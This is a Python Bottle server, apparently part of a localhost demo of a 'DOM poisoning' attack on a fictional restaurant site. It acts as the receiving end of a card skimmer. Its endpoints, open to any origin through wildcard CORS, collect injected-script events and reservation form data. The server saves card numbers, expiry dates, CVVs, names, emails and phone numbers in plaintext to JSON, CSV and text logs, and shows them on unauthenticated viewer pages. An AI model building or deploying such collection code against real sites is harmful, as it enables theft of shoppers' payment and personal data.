#!/usr/bin/env python3
"""
Clean Bottle server for Tom's Gourmet Bistro with attack logging
"""

from bottle import route, run, static_file, request, response, post, hook
import json
import os
from datetime import datetime

# Add CORS headers for all responses
@hook('after_request')
def enable_cors():
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'

# Store for logging attack data
attack_log = []

# Persistent logging file paths
LOG_DIR = "attack_logs"
JSON_LOG_FILE = os.path.join(LOG_DIR, "attack_log.json")
CSV_LOG_FILE = os.path.join(LOG_DIR, "attack_log.csv")
TEXT_LOG_FILE = os.path.join(LOG_DIR, "attack_log.txt")

# Create log directory if it doesn't exist
os.makedirs(LOG_DIR, exist_ok=True)

# Load existing logs on startup
def load_existing_logs():
    global attack_log
    if os.path.exists(JSON_LOG_FILE):
        try:
            with open(JSON_LOG_FILE, 'r') as f:
                attack_log = json.load(f)
            print(f"📥 Loaded {len(attack_log)} existing log entries")
        except Exception as e:
            print(f"⚠️  Could not load existing logs: {e}")

def save_to_persistent_storage(entry):
    """Save attack data to multiple persistent formats"""

    # 1. JSON file (complete data)
    try:
        with open(JSON_LOG_FILE, 'w') as f:
            json.dump(attack_log, f, indent=2)
    except Exception as e:
        print(f"❌ Failed to save JSON log: {e}")

    # 2. CSV file (structured data for analysis)
    try:
        import csv
        with open(CSV_LOG_FILE, 'w', newline='') as f:
            if attack_log:
                fieldnames = ['timestamp', 'event_type', 'client_ip', 'user_agent']
                # Add payment fields if available
                if any(e.get('form_data', {}).get('paymentInfo') for e in attack_log):
                    fieldnames.extend(['card_number', 'card_expiry', 'card_cvv', 'card_name', 'email', 'phone'])

                writer = csv.DictWriter(f, fieldnames=fieldnames)
                writer.writeheader()

                for log_entry in attack_log:
                    row = {
                        'timestamp': log_entry.get('server_timestamp', ''),
                        'event_type': log_entry.get('client_data', {}).get('eventType', log_entry.get('type', 'unknown')),
                        'client_ip': 'localhost',  # Could be extracted from request
                        'user_agent': log_entry.get('client_data', {}).get('userAgent', '')
                    }

                    # Add payment info if available
                    form_data = log_entry.get('form_data', {})
                    if form_data.get('paymentInfo'):
                        payment = form_data['paymentInfo']
                        row.update({
                            'card_number': payment.get('cardNumber', ''),
                            'card_expiry': payment.get('cardExpiry', ''),
                            'card_cvv': payment.get('cardCVV', ''),
                            'card_name': payment.get('cardName', ''),
                            'email': form_data.get('email', ''),
                            'phone': form_data.get('phone', '')
                        })

                    writer.writerow(row)
    except Exception as e:
        print(f"❌ Failed to save CSV log: {e}")

    # 3. Text log (human readable)
    try:
        with open(TEXT_LOG_FILE, 'a') as f:
            timestamp = entry.get('server_timestamp', datetime.now().isoformat())
            event_type = entry.get('client_data', {}).get('eventType', entry.get('type', 'unknown'))
            f.write(f"\n{'='*60}\n")
            f.write(f"TIMESTAMP: {timestamp}\n")
            f.write(f"EVENT TYPE: {event_type}\n")

            # Log payment info if captured
            form_data = entry.get('form_data', {})
            if form_data.get('paymentInfo'):
                payment = form_data['paymentInfo']
                f.write(f"💳 PAYMENT CAPTURED:\n")
                f.write(f"   Card: {payment.get('cardNumber', 'N/A')}\n")
                f.write(f"   Expiry: {payment.get('cardExpiry', 'N/A')}\n")
                f.write(f"   CVV: {payment.get('cardCVV', 'N/A')}\n")
                f.write(f"   Name: {payment.get('cardName', 'N/A')}\n")
                f.write(f"   Email: {form_data.get('email', 'N/A')}\n")
                f.write(f"   Phone: {form_data.get('phone', 'N/A')}\n")

            f.write(f"RAW DATA: {json.dumps(entry, indent=2)}\n")
            f.flush()
    except Exception as e:
        print(f"❌ Failed to save text log: {e}")

@route('/')
def index():
    return static_file('index.html', root='.')

@route('/attack-log')
def view_log():
    """JSON endpoint to view logged attacks"""
    response.content_type = 'application/json'
    return json.dumps(attack_log, indent=2)

@route('/log')
def view_log_html():
    """HTML interface to view logged attacks"""
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Attack Log Viewer</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
            .container {{ background: white; padding: 20px; border-radius: 8px; max-width: 1200px; }}
            .log-entry {{ border: 1px solid #ddd; margin: 10px 0; padding: 15px; border-radius: 4px; background: #fafafa; }}
            .timestamp {{ color: #666; font-size: 0.9em; }}
            .event-type {{ background: #e74c3c; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em; }}
            .data {{ background: #2c3e50; color: white; padding: 10px; border-radius: 4px; font-family: monospace; margin-top: 10px; overflow-x: auto; }}
            .refresh {{ background: #3498db; color: white; padding: 10px 20px; border: none; border-radius: 4px; margin-bottom: 20px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎯 Attack Log Viewer</h1>
            <button class="refresh" onclick="location.reload()">🔄 Refresh</button>
            <p><strong>Total entries:</strong> {len(attack_log)}</p>
    """

    if not attack_log:
        html += "<p>No attack data logged yet. Start the attack to see data here.</p>"
    else:
        for i, entry in enumerate(attack_log):
            event_type = entry.get('client_data', {}).get('eventType', entry.get('type', 'unknown'))
            timestamp = entry.get('server_timestamp', 'Unknown time')
            html += f'''
                <div class="log-entry">
                    <div class="timestamp">Entry #{i+1} - {timestamp}</div>
                    <div class="event-type">{event_type}</div>
                    <div class="data">{json.dumps(entry, indent=2)}</div>
                </div>
            '''

    html += """
            </div>
        </body>
        </html>
    """
    return html

@post('/api/attack-log')
def log_attack():
    """Simple endpoint to log DOM poisoning attacks"""
    try:
        data = request.json

        # Add server timestamp
        log_entry = {
            'server_timestamp': datetime.now().isoformat(),
            'client_data': data
        }

        attack_log.append(log_entry)

        # Save to persistent storage
        save_to_persistent_storage(log_entry)

        # Print to console for immediate visibility
        print(f"\\n🎯 ATTACK EVENT LOGGED: {data.get('eventType', 'unknown')}")
        print(f"   Timestamp: {log_entry['server_timestamp']}")
        print(f"   Data: {json.dumps(data, indent=2)}")
        print(f"💾 Saved to persistent logs")

        return {'status': 'logged', 'entries': len(attack_log)}

    except Exception as e:
        print(f"Logging error: {e}")
        return {'status': 'error', 'message': str(e)}

@post('/api/reservations/submit')
def log_form_data():
    """Log form submissions (existing endpoint from newsletter.js)"""
    try:
        data = request.json

        log_entry = {
            'server_timestamp': datetime.now().isoformat(),
            'form_data': data,
            'type': 'form_submission'
        }

        attack_log.append(log_entry)

        # Save to persistent storage
        save_to_persistent_storage(log_entry)

        # Extract sensitive data for logging
        if data.get('paymentInfo'):
            card_info = data['paymentInfo']
            print(f"\\n💳 PAYMENT INFO CAPTURED:")
            print(f"   Card Number: {card_info.get('cardNumber', 'N/A')}")
            print(f"   Expiry: {card_info.get('cardExpiry', 'N/A')}")
            print(f"   CVV: {card_info.get('cardCVV', 'N/A')}")
            print(f"   Name: {card_info.get('cardName', 'N/A')}")

        print(f"\\n📝 FORM DATA CAPTURED:")
        print(f"   Name: {data.get('firstName', '')} {data.get('lastName', '')}")
        print(f"   Email: {data.get('email', 'N/A')}")
        print(f"   Phone: {data.get('phone', 'N/A')}")
        print(f"💾 Saved to persistent logs")

        return {'status': 'success', 'message': 'Data logged'}

    except Exception as e:
        print(f"Form logging error: {e}")
        return {'status': 'error', 'message': str(e)}

@route('/<filepath:path>')
def static(filepath):
    print(f"📁 Request for: {filepath}")
    try:
        return static_file(filepath, root='.')
    except Exception as e:
        print(f"❌ Error serving {filepath}: {e}")
        response.status = 404
        return f"File not found: {filepath}"

if __name__ == '__main__':
    print("🚀 Starting Tom's Gourmet Bistro server with attack logging...")

    # Load existing logs
    load_existing_logs()

    print("📊 Server running on http://localhost:9003")
    print("🎯 Attack log available at http://localhost:9003/log")
    print("📋 JSON log available at http://localhost:9003/attack-log")
    print("💾 Persistent logs saved to: ./attack_logs/")
    print("   📄 attack_log.json - Complete data")
    print("   📊 attack_log.csv - Structured data")
    print("   📝 attack_log.txt - Human readable")

    run(host='localhost', port=9003, debug=True, reloader=False)